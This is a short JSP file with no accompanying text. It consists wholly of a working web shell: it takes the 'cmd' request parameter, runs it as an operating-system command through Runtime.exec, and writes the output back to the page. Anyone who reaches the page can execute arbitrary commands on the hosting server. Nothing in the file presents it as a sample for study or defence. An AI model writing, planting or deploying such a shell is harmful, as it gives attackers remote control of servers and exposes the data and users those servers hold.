<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.InputStream is = p.getInputStream();
    int ch;
    while ((ch = is.read()) != -1) {
        out.print((char) ch);
    }
}
%>
